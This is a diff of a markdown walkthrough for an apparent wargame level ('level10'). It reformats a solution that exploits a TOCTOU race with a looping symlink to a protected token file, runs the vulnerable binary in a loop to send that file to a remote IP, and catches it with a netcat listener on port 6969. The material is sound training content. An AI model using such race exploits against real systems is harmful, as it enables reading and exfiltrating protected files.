@@ -68,7 +68,7 @@ http://manpages.ubuntu.com/manpages/hirsute/en/man1/nc_openbsd.1.html
 
 Theorical steps:
 - Do a symlink again and again (in a loop)
-- launch `level10`in a loop
+- launch `level10` in a loop
 - Hope that level10 will accept our file with access
 - Then the symlink will occure
 - Then level10 will open our modified file and write it on port 6969
@@ -76,8 +76,20 @@ Theorical steps:
 
 # Solution
 
-Level10 seems to be able to sends any file we create so let's do on a first terminal connected with ssh: `while true; do rm -rf /tmp/final; touch /tmp/final; ln -sfn /home/user/level10/token /tmp/final; done` to create the file that is going to be the symlink. (`readlink -f token` to know the true path of token file). We need to suppress and create a new file each time or the symlink will apply on tmp/final and will not pass the access() check again.
+Level10 seems to be able to sends any file we create so let's do on a first terminal connected with ssh: 
 
-On a second ssh terminal let's do: `while true; do (./level10 /tmp/final 10.11.200.134); done` to execute level10 in a loop.
+- Create the file that is going to be the symlink (`readlink -f token` to know the true path of token file):
+```bash
+while true; do rm -rf /tmp/final; touch /tmp/final; ln -sfn /home/user/level10/token /tmp/final; done
+```
+We need to suppress and create a new file each time or the symlink will apply on `tmp/final` and will not pass the `access()` check again.
 
-On a third terminal, we can listen to the port 6969 with the netcat command: `while true; do nc -l 6969 ;done`
+- On a second ssh terminal let's execute level10 in a loop: 
+```bash 
+while true; do (./level10 /tmp/final 10.11.200.134); done
+```
+
+- On a third terminal, we can listen to the port 6969 with the netcat command: 
+```bash
+while true; do nc -l 6969 ;done
+```
